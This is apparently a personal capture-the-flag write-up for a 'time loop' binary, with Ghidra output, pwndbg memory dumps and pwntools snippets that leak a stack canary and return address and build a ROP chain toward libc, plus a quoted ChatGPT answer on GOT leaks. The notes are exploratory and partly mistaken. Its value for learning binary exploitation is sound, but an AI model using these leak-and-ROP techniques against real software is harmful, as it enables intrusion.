# reversing 

## main function shown in ghidra 

```c
undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("You are trapped in a time loop.");
  puts("Everything will reset after 3 days. If you want to escape, you must do it within 3 days");
  time_loop(3);
  puts("You failed to escape, the time loops continues.....");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
```c
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
```
in pair with 
```c
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
```
strongly suggests that it's just a canary 
```
    12e1:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    12e8:	00 00 
    12ea:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
```
```
    1384:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    1388:	64 48 33 14 25 28 00 	xor    rdx,QWORD PTR fs:0x28
    138f:	00 00 
    1391:	74 05                	je     1398 <main+0xc3>
    1393:	e8 18 fd ff ff       	call   10b0 <__stack_chk_fail@plt>
```

```
┌──(kali㉿kali)-[~/Desktop/CTF/legend]
└─$ checksec program
[*] '/home/kali/Desktop/CTF/legend/program'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
so...that means we 
- cannot do GOT hijacking
- need to leak stack addresses for canaries 
- cannot inject shell code
- can return to libc system via ROP chain
  

```c
void time_loop(int param_1)

{
  long in_FS_OFFSET;
  int i;
  char *day [4];
  char buffer [24];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  day[0] = "first";
  day[1] = "second";
  day[2] = "last";
  for (i = 0; i < param_1; i = i + 1) {
    printf("Dawn of the %s day\n%d hours remaining\n",day[i],(ulong)(i * -24 + 72));
    read(0,buffer,80);
    puts("So this is what you tried to do to escape?");
    puts(buffer);
  }
  fwrite("3 days have passed",1,0x12,stdout);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

this is the time_loop function and I have no clue   
interesting thing
```c
 char *day [4];
```

```
72 hours remaining
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
So this is what you tried to do to escape?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
���yQ
```
`���yQ` it seems like 
```c
puts(buffer);
```
crashed or some like, let me look deep into it


```
pwndbg> ni
12345678
����
```

sometimes it prints sometimes it doesn't


# GOAL: Getting canary printed 

i am now filling with some values of A and inpsecting the memory
canary is at rbp-0x8
buffer starts at $rbp-0x20

there are 16 bytes between them 

```
pwndbg> x/32xb $rbp-0x20
0x7ffc0d435a30: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffc0d435a38: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffc0d435a40: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffc0d435a48: 0x00    0x54    0x08    0x43    0xd2    0xc3    0xc6    0x73
pwndbg> x/8xb $rbp-0x8
0x7ffc0d435a48: 0x00    0x54    0x08    0x43    0xd2    0xc3    0xc6    0x73
pwndbg> x/gx $rbp-0x8
0x7ffc0d435a48: 0x73c6c3d243085400
```
indeed....


But, there are some problems, first, I am not sure but it seems it reads canary from the back and it terminates at there 
```
pwndbg> x/40xb $rbp-0x20
0x7ffc0d435a30: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffc0d435a38: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffc0d435a40: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffc0d435a48: 0x00    0x54    0x08    0x43    0xd2    0xc3    0xc6    0x73
0x7ffc0d435a50: 0x70    0x5a    0x43    0x0d    0xfc    0x7f    0x00 
```

I think I do it like this I am just going to test now, my last 'A' would be at the null byte of the canary and I starts reading until next null byte i.e. 7 th byte at `0x7ffc0d435a50` i.e.  `0x7ffc0d435a56`

so there are 14 characters and I am discard the first one, last 6 and add a null terminator at the end 

python output:

414141414141414141414141414141414141414141414141**41**bb8093413280**4f** e0 d7 0c c5 fc 7f 0a 44 61 77 6e



pwndbg> x/32xb $rbp-0x20
0x7ffcc50cd7a0: 0x73    0x0a    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffcc50cd7a8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffcc50cd7b0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffcc50cd7b8: **0x41**    0xbb    0x80    0x93    0x41    0x32    0x80    0x4f


now the only problem is parsing it:


# yep we can now # 0xa6532fe089838341 now we can we the canary


correctly parsing the bytes we received and getting the canary 

```py
canary_bytes = output[24:32]
canary = u64(canary_bytes)
canary = canary & 0xffffffffffffff00  # Mask out the last byte
print(canary)
print(hex(canary))
```

Here we have it!
```
1763100710460685568
0x1877cac13e3f7d00
```

THe problem now is this:

```
pwndbg> x/32xb $rbp-0x20
0x7ffcc50cd7a0: 0x73    0x0a    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffcc50cd7a8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffcc50cd7b0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffcc50cd7b8: **0x41**    0xbb    0x80    0x93    0x41    0x32    0x80    0x4f
```
we changed the canary value early to get the canary, now we need to change it back 

with:

```py
p.recvuntil(b"hours remaining\n")
p.send(b'B' * 24 + b'\x00')
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
```

#  of the last day, 24 hours remaining

now we get to the last day, 

oh i just realized, seems like we need to:
1. write everything backwards, including the canary
2. leak the return address (if we need to use ROP chaining to go back to `time_loop` once again) do we? yes we do, at least 2 payload
- one to leak libc function address 
- one to call system 

so...

```py
p.recvuntil(b"hours remaining\n")
p.send(b'B' * 24 + b'\x00')
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
```
is wrong 

we didn't need to parse the canary that much, just overwrite it in litt'e endian and then it's fine 

or since we have already parsed it, we can just do: to_bytes



### Finding the return address to main!

```
0c:0060│ rbp 0x7ffccb08c600 —▸ 0x7ffccb08c620 ◂— 1
0d:0068│+008 0x7ffccb08c608 —▸ 0x556b7fc3a373 (main+158) ◂— lea rdi, [rip + 0xd86]
```

which starts 8 more bytes after the canary
```
pwndbg> x/32xb $rbp-0x20
0x7ffccb08c5e0: 0x31    0x0a    0x42    0x42    0x42    0x42    0x42    0x42
0x7ffccb08c5e8: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x7ffccb08c5f0: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x7ffccb08c5f8: 0x00    0xcd    0xa3    0x45    0xa6    0xbb    0x7f    0x97
pwndbg> x/48xb $rbp-0x20
0x7ffccb08c5e0: 0x31    0x0a    0x42    0x42    0x42    0x42    0x42    0x42
0x7ffccb08c5e8: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x7ffccb08c5f0: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x7ffccb08c5f8: 0x00    0xcd    0xa3    0x45    0xa6    0xbb    0x7f    0x97
0x7ffccb08c600: 0x20    0xc6    0x08    0xcb    0xfc    0x7f    0x00    0x00
0x7ffccb08c608: 0x73    0xa3    0xc3    0x7f    0x6b    0x55    0x00    0x00
pwndbg> x/gx $rbp+0x8
0x7ffccb08c608: 0x0000556b7fc3a373
```

Therefore lets use 8 more bytes of C to overwrite old rbp and get to return address 
```py
p.send(b'B' * 24 + p64(canary) + b'C' * 8) 
```
this time we really need to parse it carefully and leak the function address of time_loop so that we can loop back again before the end of last day
```py
return_addr = output[40:]
return_addr = u64(return_addr)
# timeloop_address = return_addr - rip offset + timeloop offset
timeloop_address = return_addr - 0x1373 + 0x11e9
print(hex(return_addr))
print(hex(timeloop_address))
```

you are being a little too exitced now, you need to calm the fuck down 


doing 
```
p.send(b'B' * 24 + p64(canary) + b'C' * 8) # prevsering canary 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
print(output)
return_addr = output[40:].ljust(8, b'\x00')
print(return_addr)
return_addr = u64(return_addr)
# timeloop_address = return_addr - rip offset + timeloop offset
timeloop_address = return_addr - 0x1373 + 0x11e9
print(hex(return_addr))
print(hex(timeloop_address))
```

on the second day, does not work because `output` gets terminated because of the canary you wrote

you can pad with something else, get the return address and on the last day which you don't ened to rely on the output to leak anything. You can then preverse the canary value as well as overwriting the return address back to time_loop 

Therefore, it should be something like the following instead:

Second day
```
p.send(b'B' * 24 + b'C' * 16) # 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
print(output)
return_addr = output[40:].ljust(8, b'\x00')
print(return_addr)
return_addr = u64(return_addr)
# timeloop_address = return_addr - rip offset + timeloop offset
timeloop_address = return_addr - 0x1373 + 0x11e9
print(hex(return_addr))
print(hex(timeloop_address))
```


Last day:

```
p.send(b'B' * 24 + p64(canary) + b'C' * 8 + <time_loop>) # prevsering canary 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
print(output)
return_addr = output[40:].ljust(8, b'\x00')
print(return_addr)
return_addr = u64(return_addr)
# timeloop_address = return_addr - rip offset + timeloop offset
timeloop_address = return_addr - 0x1373 + 0x11e9
print(hex(return_addr))
print(hex(timeloop_address))
```

yep!
```
b'BBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCs\x03\xd7\x83FV\nDawn'
b's\x03\xd7\x83FV\x00\x00'
0x564683d70373
0x564683d701e9
```

but shouldn't it be 1373 and 11e9? lol nvm it should be ok 


turned out the return address is actually just 0x0373 and 0x01e9 

idk why objdump shows 
```
0000000000011e9 <time_loop>:
    11e9:	f3 0f 1e fa          	endbr64
    11ed:	55                   	push   rbp
    11ee:	48 89 e5 
```
11e9 # even elf.sym['time_loop'] prints this, but it doesnot work 


i just `ni` through my second loop in time_loop, I think i am missing the first argument since it just passed through
I need an argument to get into buffer and write my second payload



# last day 
- pop rdi gadget to leak address 
- tried to return back to the function for more payload to overwrite
- doesn't work probably of the payload is already 80+
- trying passing more days, e.g. 5 days and it didn't work 

```
payload = flat(
    b'B' * 24, # oh wait I 
    p64(canary),
    b'C' * 8,
    p64(base_addr + 0x000000000001403),
    p64(elf.got['puts'] + base_addr),
    p64(elf.plt['puts'] + base_addr),
    p64(base_addr + 0x000000000001403),
    p64(3),
    p64(timeloop_address)
)
```

now I am thinking about utilizing this space
`b'B' * 24`

but would it work?

hmm.




# how about

1st day leak return address 
2nd day leak canary + ROP chain to leak libc address 

nvm can't the chain wont return at that time 

wait, it does have to return at that time, the value would be there, and I return on last day anyways 


ohhhh wait
maybe i can write 

```py
    p64(base_addr + 0x000000000001403),
    p64(3),
    p64(timeloop_address)
```

to `b*24`, and then I return there


```py 
payload = flat(
    
    # padding + get the return addresses ready
    # to go back to same function to write more
    p64(base_addr + 0x000000000001403), # rsp-0x20 ?
    p64(3), 
    p64(timeloop_address),
    p64(canary),
    b'C' * 8, # padding to get to return address
    # leak libc function address
    p64(base_addr + 0x000000000001403),
    p64(elf.got['puts'] + base_addr),
    p64(elf.plt['puts'] + base_addr),
    p64(0x00000000000012d3 + base_addr) # rsp-0x20 ?


    # go back to same function to write more
    
)
```


# new idea 

```
__libc_start_main+243

x7fffe831fab8 —▸ 0x7f6851cbe083 (__libc_start_main+243) ◂— mov edi, eax
```

the above is something in the GOT 
use the above to leak libc base address in the second loop, the above is located in the return address 

in the second loop, old rbp 'cccccccc' would be pushed and become was new rbp 

then after the second loop's second day, we calculate the libc address 
then on the second loop's last day, we use the leaked address to call libc system directly 


# From chatgpt about 
3fe0 is the address in the GOT (Global Offset Table) where the address of `__libc_start_main` is stored. 

we can first test by output `__libc_start_main`'s libc offset and subtracting with the leak we see below in pwndbg to see if it works! 

Let's break down that instruction:
```
call QWORD PTR [rip+0x2eb2]
```
- Current RIP is at 1128
- 1128 + 0x2eb2 + 6 = 3fe0 (The +6 accounts for instruction length)
- 3fe0 is where the GOT entry for `__libc_start_main` is located

So if you want to leak `__libc_start_main`'s actual address from libc, you would:
1. Add 0x3fe0 to the base_addr to get the GOT entry address
2. Read from that address to get the actual libc function address

Like this:
```python
libc_start_main_got = base_addr + 0x3fe0
# Use this in your payload to leak it:
payload = flat(
    b'B' * 24,        # padding to canary
    p64(canary),      # canary
    p64(rbp),         # saved rbp
    p64(pop_rdi),     
    p64(libc_start_main_got),  # GOT entry address
    p64(puts_plt + base_addr)
)
```

Would you like me to show a complete version using `__libc_start_main` for the leak instead of `puts`?


turned out it is indeed a possible solve, kinda ridiculous to that you got to look for an address like that. You gotta to be looking quite carefully at the stack for the return addresses lol 

